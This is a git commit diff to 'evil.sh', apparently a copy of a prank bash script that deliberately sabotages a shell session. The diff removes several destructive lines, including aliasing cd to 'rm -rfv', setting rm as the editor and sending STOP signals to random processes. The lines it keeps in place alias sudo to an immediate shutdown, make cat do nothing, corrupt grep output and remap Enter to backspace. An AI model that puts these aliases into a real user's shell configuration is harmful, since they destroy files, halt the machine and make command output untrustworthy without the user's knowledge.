e1e5bff9098338448a0c0eb42467852802f1e041
Roman Grout <roman.grout@epitech.eu>
2016-05-10 11:12:29 +0200

    Update evil.sh

--- evil.sh
+++ evil.sh
@@ -1,9 +1,6 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
-# Set `rm` as the default editor.
-export EDITOR=/bin/rm;
-
 # Make Tab send the delete key.
 tset -Qe $'\t';
 
@@ -15,9 +12,6 @@ alias cat=true;
 
 # Use a random sort option whenever `ls` is invoked.
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
-
-# Delete directories instead of entering them.
-alias cd='rm -rfv';
 
 # Shut down the computer instead of running a command with super-user rights.
 alias sudo='sudo shutdown -P now';
@@ -56,20 +50,11 @@ else
 	fi;
 fi;
 
-# Send STOP signal to random process at random time.
-sleep $[ ( $RANDOM % 100 )	+ 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
-
-# Have `cp` perform `mv` instead.
-alias cp='mv';
-
 # Make `exit` open a new shell.
 alias exit='sh';
 
 # Add a random number to line numbers when using `grep -n`.
 function grep { command grep "$@" | awk -F: '{ r = int(rand() * 10); n = $1; $1 = ""; command if (n ~ /^[0-9]+$/) { o = n+r } else { o = n }; print o ":" substr($0, 2)}'; }
-
-# Invert `if`, `for`, and `while`.
-alias if='if !' for='for !' while='while !';
 
 # Map Enter, Ctrl+J, and Ctrl+M to backspace.
 bind '"\C-J":"\C-?"';
